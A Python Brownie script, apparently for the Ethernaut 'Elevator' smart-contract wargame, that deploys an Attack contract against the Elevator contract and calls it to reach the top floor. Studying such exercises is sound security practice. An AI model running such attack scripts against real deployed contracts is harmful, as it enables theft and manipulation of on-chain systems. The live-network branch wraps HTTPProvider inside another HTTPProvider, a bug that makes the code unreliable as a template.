from brownie import Contract, Attack, Elevator, network, config
from scripts.helpful_scripts import get_account, LOCAL_BLOCKCHAIN_ENVIRONMENTS
from web3 import Web3


def attack():

    account = get_account()

    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:

        web3 = Web3(Web3.HTTPProvider("http://127.0.0.1:8545"))

        elevator = Elevator.deploy({"from": account})

        attack = Attack.deploy(elevator, {"from": account})

    else:

        web3 = Web3(
            Web3.HTTPProvider(
                Web3.HTTPProvider(config["networks"][network.show_active()]["infura"])
            )
        )

        elevator = Contract.from_abi(
            Elevator._name,
            config["networks"][network.show_active()]["elevator"],
            Elevator.abi,
        )

        attack = Attack.deploy(elevator, {"from": account})

    attack.attack().wait(1)

    print(f"Current floor is {elevator.floor()}")
    print(f"Top floor is {elevator.top()}")


def main():
    attack()
